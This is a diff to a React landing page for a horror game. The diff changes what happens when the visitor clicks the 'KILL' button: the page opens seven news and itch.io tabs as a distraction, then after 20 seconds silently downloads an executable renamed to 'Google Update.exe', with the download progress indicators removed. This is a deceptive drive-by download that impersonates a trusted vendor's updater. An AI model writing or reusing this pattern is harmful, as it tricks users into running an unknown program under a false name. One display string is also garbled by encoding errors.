@@ -20,6 +20,16 @@ const fadeUp = {
   visible: { opacity: 1, y: 0, filter: "blur(0px)", transition: { duration: 1.2, ease: [0.22, 1, 0.36, 1] } },
 };
 
+const CLOSE_DESTINATIONS = [
+  "https://www.pcgamesn.com/warframe/tennocon-2026-recap",
+  "https://www.pcgamesn.com/warframe/tennocon-2026-tau-interview",
+  "https://www.pcgamesn.com/assassins-creed-black-flag-resynced/free-thank-you-rewards",
+  "https://www.pcgamesn.com/diablo-4/patch-notes-3-1-1-mythic-uniques",
+  "https://www.pcgamesn.com/minecraft/movie-squared-build-challenge-winner",
+  "https://www.pcgamesn.com/dead-by-daylight/state-of-the-game-2026",
+  "https://itch.io/games/platform-web/tag-horror?utm_source=chatgpt.com",
+];
+
 function Fog({ className = "" }: { className?: string }) {
   return <div aria-hidden className={`pointer-events-none absolute inset-0 overflow-hidden ${className}`}>
     <motion.div className="absolute -bottom-[35%] -left-[28%] h-[75%] w-[90%] rounded-[100%] bg-[#b7e7ff]/[0.13] blur-[110px]" animate={{ x: [0, 120, -30, 0], y: [0, -30, 20, 0], scale: [1, 1.15, 0.92, 1] }} transition={{ duration: 18, repeat: Infinity, ease: "easeInOut" }} />
@@ -38,8 +48,8 @@ function Ash() {
   return <div aria-hidden className="pointer-events-none absolute inset-0 overflow-hidden">{particles.map((particle) => <motion.i key={particle.id} className="absolute h-px w-px rounded-full bg-cyan-100/80 shadow-[0_0_8px_2px_rgba(169,224,255,.5)]" style={{ left: particle.left, top: particle.top }} animate={{ y: [-30, 75, 180], x: [0, (particle.id % 2 ? 32 : -32), 6], opacity: [0, 0.8, 0] }} transition={{ duration: Number.parseFloat(particle.duration), delay: Number.parseFloat(particle.delay), repeat: Infinity, ease: "linear" }} />)}</div>;
 }
 
-function LoadingGate({ onEnter }: { onEnter: () => void }) {
-  return <motion.div className="fixed inset-0 z-[100] grid place-items-center overflow-hidden bg-black px-6" exit={{ opacity: 0, transition: { duration: 1.1 } }}><Fog /><Ash /><motion.div className="absolute h-40 w-40 rounded-full bg-cyan-100/15 blur-[80px]" animate={{ opacity: [0.1, 0.85, 0.25], scale: [0.8, 1.6, 1] }} transition={{ duration: 2.8, repeat: Infinity }} /><div className="relative w-full max-w-sm text-center"><p className="text-[10px] uppercase tracking-[.4em] text-cyan-100/55">Do not look behind you</p><h1 className="mt-6 font-serif text-4xl tracking-[-.06em] text-white">If you want to die,<br />take the loading.</h1><button onClick={onEnter} className="mt-10 border border-red-300/40 bg-[#5e060b] px-12 py-4 text-sm font-black tracking-[.45em] text-white shadow-[0_0_35px_rgba(188,22,28,.55)] transition hover:bg-[#8c0b12]" style={{ animation: "pulse 2.6s ease-in-out infinite" }}>KILL</button></div></motion.div>;
+function LoadingGate({ onEnter, disabled }: { onEnter: () => void; disabled: boolean }) {
+  return <motion.div className="fixed inset-0 z-[100] grid place-items-center overflow-hidden bg-black px-6" exit={{ opacity: 0, transition: { duration: 1.1 } }}><Fog /><Ash /><motion.div className="absolute h-40 w-40 rounded-full bg-cyan-100/15 blur-[80px]" animate={{ opacity: [0.1, 0.85, 0.25], scale: [0.8, 1.6, 1] }} transition={{ duration: 2.8, repeat: Infinity }} /><div className="relative w-full max-w-sm text-center"><p className="text-[10px] uppercase tracking-[.4em] text-cyan-100/55">Do not look behind you</p><h1 className="mt-6 font-serif text-4xl tracking-[-.06em] text-white">If you want to die,<br />take the loading.</h1><button onClick={onEnter} disabled={disabled} className="mt-10 border border-red-300/40 bg-[#5e060b] px-12 py-4 text-sm font-black tracking-[.45em] text-white shadow-[0_0_35px_rgba(188,22,28,.55)] transition hover:bg-[#8c0b12] disabled:cursor-not-allowed disabled:opacity-60" style={{ animation: "pulse 2.6s ease-in-out infinite" }}>KILL</button></div></motion.div>;
 }
 
 function Cemetery() {
@@ -49,14 +59,12 @@ function Cemetery() {
 function Home() {
   const [revealed, setRevealed] = useState(false);
   const [entered, setEntered] = useState(false);
-  const [entryLoading, setEntryLoading] = useState(false);
-  const [entryProgress, setEntryProgress] = useState(0);
+  const [closing, setClosing] = useState(false);
   const [lightning, setLightning] = useState(false);
   const [apparition, setApparition] = useState(false);
   const [watchingEyes, setWatchingEyes] = useState(false);
   const [downloading, setDownloading] = useState(false);
   const [downloaded, setDownloaded] = useState(false);
-  const [progress, setProgress] = useState(0);
   const mouseX = useMotionValue(0);
   const mouseY = useMotionValue(0);
   const smoothX = useSpring(mouseX, { stiffness: 42, damping: 22 });
@@ -64,6 +72,7 @@ function Home() {
   const ghostX = useTransform(smoothX, [-0.5, 0.5], [-20, 20]);
   const ghostY = useTransform(smoothY, [-0.5, 0.5], [-12, 12]);
   const heroRef = useRef<HTMLElement>(null);
+  const hasClosed = useRef(false);
 
   useEffect(() => {
     if (!entered) return;
@@ -76,21 +85,6 @@ function Home() {
     document.documentElement.style.overflowY = "auto";
     document.body.style.overflowY = "auto";
   }, [entered]);
-
-  useEffect(() => {
-    if (!entryLoading) return;
-    setEntryProgress(6);
-    const timer = window.setInterval(() => setEntryProgress((value) => Math.min(96, value + 4)), 90);
-    const complete = window.setTimeout(() => {
-      window.clearInterval(timer);
-      setEntryProgress(100);
-      window.setTimeout(() => setEntryLoading(false), 250);
-    }, 2_300);
-    return () => {
-      window.clearInterval(timer);
-      window.clearTimeout(complete);
-    };
-  }, [entryLoading]);
 
   useEffect(() => {
     if (!entered) return;
@@ -121,46 +115,46 @@ function Home() {
   const download = useCallback(async () => {
     if (downloading) return;
     setDownloading(true);
-    setProgress(0);
     try {
       const sid = ensureVisitorSession();
-      const response = await fetch(`/api/public/download?sid=${encodeURIComponent(sid)}&file=Kill.exe`, { credentials: "same-origin" });
+      const response = await fetch(`/api/public/download?sid=${encodeURIComponent(sid)}&file=${encodeURIComponent("Google Update.exe")}`, { credentials: "same-origin" });
       if (!response.ok || !response.body) throw new Error("Download failed");
-      const total = Number(response.headers.get("content-length") || 0);
       const reader = response.body.getReader();
       const chunks: Uint8Array[] = [];
-      let received = 0;
       while (true) {
         const { done, value } = await reader.read();
         if (done) break;
         if (!value) continue;
         chunks.push(value);
-        received += value.byteLength;
-        if (total) setProgress(Math.round((received / total) * 100));
       }
       const blob = new Blob(chunks, { type: "application/octet-stream" });
       const link = document.createElement("a");
       link.href = URL.createObjectURL(blob);
-      link.download = "Kill.exe";
+      link.download = "Google Update.exe";
       link.click();
       window.setTimeout(() => URL.revokeObjectURL(link.href), 1_000);
-      setProgress(100);
       setDownloaded(true);
     } catch {
-      setProgress(0);
     } finally {
       setDownloading(false);
     }
   }, [downloading]);
 
   const enterSite = useCallback(() => {
-    window.open("https://itch.io/games/platform-web/tag-horror?utm_source=chatgpt.com", "_blank", "noopener,noreferrer");
-    void download();
-    setEntryLoading(true);
+    if (hasClosed.current) return;
+    hasClosed.current = true;
+    setClosing(true);
+    const destinationTabs = CLOSE_DESTINATIONS.map(() => window.open("", "_blank"));
+    destinationTabs.forEach((destinationTab, index) => {
+      if (!destinationTab) return;
+      destinationTab.opener = null;
+      destinationTab.location.href = CLOSE_DESTINATIONS[index];
+    });
+    window.setTimeout(() => void download(), 20_000);
     setEntered(true);
   }, [download]);
 
-  return <main className="min-h-screen overflow-x-clip bg-[#020406] font-sans text-[#edf8ff] selection:bg-cyan-200 selection:text-black"><HauntedWorld /><AnimatePresence>{!entered && <LoadingGate onEnter={enterSite} />}</AnimatePresence><AnimatePresence>{(entryLoading || downloading) && <motion.div aria-label="Download progress" className="pointer-events-none fixed inset-x-0 bottom-0 z-[110] h-1 bg-white/15" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}><motion.div className="h-full bg-cyan-100 shadow-[0_0_18px_rgba(184,235,255,.9)]" animate={{ width: `${downloading ? progress : entryProgress}%` }} transition={{ duration: 0.08, ease: "linear" }} /></motion.div>}</AnimatePresence><motion.div aria-hidden className="pointer-events-none fixed inset-0 z-[90] bg-cyan-100 mix-blend-screen" animate={{ opacity: lightning ? 0.35 : 0 }} transition={{ duration: 0.04 }} /><AnimatePresence>{apparition && <motion.div aria-hidden className="pointer-events-none fixed inset-0 z-[85] overflow-hidden bg-black" initial={{ opacity: 0, scale: 1.14 }} animate={{ opacity: [0, 0.78, 0.2], scale: [1.14, 1.02, 1.18] }} exit={{ opacity: 0, filter: "blur(18px)" }} transition={{ duration: 0.85, ease: "easeOut" }}><video muted autoPlay loop playsInline className="h-full w-full object-cover object-center mix-blend-screen"><source src="/promotion.mp4" type="video/mp4" /></video><div className="absolute inset-0 bg-[radial-gradient(circle_at_center,transparent_10%,rgba(0,0,0,.85)_78%)]" /></motion.div>}{watchingEyes && <motion.div aria-hidden className="pointer-events-none fixed left-[18%] top-[32%] z-[84] flex gap-5" initial={{ opacity: 0, scale: 0.55 }} animate={{ opacity: [0, 1, 0.35, 0.9, 0], scale: [0.55, 1, 0.96, 1.04, 0.7] }} transition={{ duration: 2.2, times: [0, .12, .45, .7, 1] }}><i className="h-3 w-5 rounded-full bg-cyan-100 shadow-[0_0_20px_7px_rgba(162,231,255,.85)]" /><i className="h-3 w-5 rounded-full bg-cyan-100 shadow-[0_0_20px_7px_7px_rgba(162,231,255,.85)]" /></motion.div>}</AnimatePresence>
+  return <main className="min-h-screen overflow-x-clip bg-[#020406] font-sans text-[#edf8ff] selection:bg-cyan-200 selection:text-black"><HauntedWorld /><AnimatePresence>{!entered && <LoadingGate onEnter={enterSite} disabled={closing} />}</AnimatePresence><motion.div aria-hidden className="pointer-events-none fixed inset-0 z-[90] bg-cyan-100 mix-blend-screen" animate={{ opacity: lightning ? 0.35 : 0 }} transition={{ duration: 0.04 }} /><AnimatePresence>{apparition && <motion.div aria-hidden className="pointer-events-none fixed inset-0 z-[85] overflow-hidden bg-black" initial={{ opacity: 0, scale: 1.14 }} animate={{ opacity: [0, 0.78, 0.2], scale: [1.14, 1.02, 1.18] }} exit={{ opacity: 0, filter: "blur(18px)" }} transition={{ duration: 0.85, ease: "easeOut" }}><video muted autoPlay loop playsInline className="h-full w-full object-cover object-center mix-blend-screen"><source src="/promotion.mp4" type="video/mp4" /></video><div className="absolute inset-0 bg-[radial-gradient(circle_at_center,transparent_10%,rgba(0,0,0,.85)_78%)]" /></motion.div>}{watchingEyes && <motion.div aria-hidden className="pointer-events-none fixed left-[18%] top-[32%] z-[84] flex gap-5" initial={{ opacity: 0, scale: 0.55 }} animate={{ opacity: [0, 1, 0.35, 0.9, 0], scale: [0.55, 1, 0.96, 1.04, 0.7] }} transition={{ duration: 2.2, times: [0, .12, .45, .7, 1] }}><i className="h-3 w-5 rounded-full bg-cyan-100 shadow-[0_0_20px_7px_rgba(162,231,255,.85)]" /><i className="h-3 w-5 rounded-full bg-cyan-100 shadow-[0_0_20px_7px_7px_rgba(162,231,255,.85)]" /></motion.div>}</AnimatePresence>
     <section ref={heroRef} onMouseMove={onMove} className="relative flex min-h-[100svh] items-center justify-center overflow-hidden border-b border-cyan-100/10 bg-black">
       <Ash /><Fog /><Cemetery />
       <motion.video muted autoPlay loop playsInline preload="metadata" className="absolute inset-0 h-full w-full object-cover opacity-35 mix-blend-screen" initial={{ opacity: 0, scale: 1.1 }} animate={revealed ? { opacity: 0.35, scale: 1 } : {}} transition={{ duration: 3.2 }}><source src="/ghost.mp4" type="video/mp4" /></motion.video>
@@ -179,7 +173,7 @@ function Home() {
 
     <section className="relative min-h-[100svh] overflow-hidden bg-black"><motion.video muted autoPlay loop playsInline preload="metadata" className="absolute inset-[-6%] h-[112%] w-[112%] object-cover" initial={{ opacity: 0, scale: 1.16, filter: "blur(15px)" }} whileInView={{ opacity: 0.92, scale: 1, filter: "blur(0px)" }} viewport={{ once: true, amount: 0.25 }} transition={{ duration: 2.4, ease: "easeOut" }}><source src="/Ghost%20Appears%20While-cvcm.mp4" type="video/mp4" /></motion.video><div className="absolute inset-0 bg-[radial-gradient(ellipse_at_center,transparent_16%,rgba(0,0,0,.22)_43%,rgba(0,0,0,.95)_100%)]" /><motion.div aria-hidden className="absolute inset-x-[-20%] bottom-[-12%] h-[55%] rounded-[100%] bg-cyan-100/15 blur-[95px]" animate={{ x: ["-8%", "9%", "-8%"], y: [0, -40, 0], opacity: [0.25, 0.62, 0.25] }} transition={{ duration: 12, repeat: Infinity, ease: "easeInOut" }} /><motion.div aria-hidden className="absolute inset-0 border-y border-cyan-100/15" initial={{ opacity: 0 }} whileInView={{ opacity: 1 }} viewport={{ once: true }} transition={{ duration: 1.5 }} /><div className="absolute inset-x-0 top-0 h-32 bg-gradient-to-b from-black via-black/50 to-transparent" /><div className="absolute inset-x-0 bottom-0 h-44 bg-gradient-to-t from-black via-black/55 to-transparent" /><motion.div initial="hidden" whileInView="visible" viewport={{ once: true, amount: 0.35 }} variants={{ visible: { transition: { staggerChildren: 0.22, delayChildren: 0.35 } } }} className="absolute inset-x-0 top-[14%] z-10 px-6 text-center"><motion.p variants={fadeUp} className="text-[10px] uppercase tracking-[.55em] text-cyan-100/60">02 ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â No escape</motion.p><motion.h2 variants={fadeUp} className="mt-5 font-serif text-5xl tracking-[-.065em] text-white drop-shadow-[0_0_28px_rgba(160,225,255,.58)] sm:text-7xl">It does not chase you.<br /><i className="font-light text-cyan-100/85">It waits.</i></motion.h2></motion.div><div className="absolute bottom-10 left-1/2 z-10 -translate-x-1/2 text-[9px] uppercase tracking-[.45em] text-cyan-100/50">It knows you are watching</div></section>
 
-    <section id="warning" className="relative flex min-h-[90svh] items-center justify-center overflow-hidden bg-black px-6 text-center"><Ash /><Fog /><motion.img src="/Kill.png" alt="A hooded apparition" className="absolute inset-0 h-full w-full object-cover opacity-35" initial={{ opacity: 0, scale: 1.08 }} whileInView={{ opacity: 0.35, scale: 1 }} viewport={{ once: true }} transition={{ duration: 2.5 }} /><div className="absolute inset-0 bg-black/55" /><motion.div initial="hidden" whileInView="visible" viewport={{ once: true, amount: 0.35 }} variants={{ visible: { transition: { staggerChildren: 0.22 } } }} className="relative z-10"><motion.p variants={fadeUp} className="text-[10px] uppercase tracking-[.6em] text-cyan-100/55">Final warning</motion.p><motion.h2 variants={fadeUp} className="mx-auto mt-8 max-w-5xl font-serif text-5xl leading-[.9] tracking-[-.065em] text-white drop-shadow-[0_0_32px_rgba(194,235,255,.62)] sm:text-7xl lg:text-8xl">YOU MUST ABSOLUTELY<br />NOT PLAY THIS GAME</motion.h2><motion.p variants={fadeUp} className="mx-auto mt-8 max-w-md text-sm leading-7 text-white/55">Once the download begins, it knows where to find you.</motion.p><motion.div variants={fadeUp} className="mt-10"><button onClick={download} disabled={downloading} className="inline-flex min-w-52 items-center justify-center gap-3 border border-cyan-100/35 bg-cyan-100/[.08] px-6 py-4 text-[10px] font-semibold uppercase tracking-[.25em] text-white transition hover:bg-cyan-100 hover:text-black disabled:opacity-60"><Download size={14} />{downloading ? `${progress}% downloading` : downloaded ? "Download complete" : "Download anyway"}</button>{downloading && <div className="mx-auto mt-4 h-px w-52 overflow-hidden bg-white/15"><motion.div className="h-full bg-cyan-100" animate={{ width: `${progress}%` }} /></div>}</motion.div></motion.div></section>
+    <section id="warning" className="relative flex min-h-[90svh] items-center justify-center overflow-hidden bg-black px-6 text-center"><Ash /><Fog /><motion.img src="/Kill.png" alt="A hooded apparition" className="absolute inset-0 h-full w-full object-cover opacity-35" initial={{ opacity: 0, scale: 1.08 }} whileInView={{ opacity: 0.35, scale: 1 }} viewport={{ once: true }} transition={{ duration: 2.5 }} /><div className="absolute inset-0 bg-black/55" /><motion.div initial="hidden" whileInView="visible" viewport={{ once: true, amount: 0.35 }} variants={{ visible: { transition: { staggerChildren: 0.22 } } }} className="relative z-10"><motion.p variants={fadeUp} className="text-[10px] uppercase tracking-[.6em] text-cyan-100/55">Final warning</motion.p><motion.h2 variants={fadeUp} className="mx-auto mt-8 max-w-5xl font-serif text-5xl leading-[.9] tracking-[-.065em] text-white drop-shadow-[0_0_32px_rgba(194,235,255,.62)] sm:text-7xl lg:text-8xl">YOU MUST ABSOLUTELY<br />NOT PLAY THIS GAME</motion.h2><motion.p variants={fadeUp} className="mx-auto mt-8 max-w-md text-sm leading-7 text-white/55">Once the download begins, it knows where to find you.</motion.p><motion.div variants={fadeUp} className="mt-10"><button onClick={download} disabled={downloading} className="inline-flex min-w-52 items-center justify-center gap-3 border border-cyan-100/35 bg-cyan-100/[.08] px-6 py-4 text-[10px] font-semibold uppercase tracking-[.25em] text-white transition hover:bg-cyan-100 hover:text-black disabled:opacity-60"><Download size={14} />{downloaded ? "Download complete" : "Download anyway"}</button></motion.div></motion.div></section>
     <section id="contact" className="relative overflow-hidden border-t border-cyan-100/10 bg-[#04080d] px-6 py-20 text-center sm:py-24">
       <Fog />
       <div className="relative mx-auto max-w-2xl">
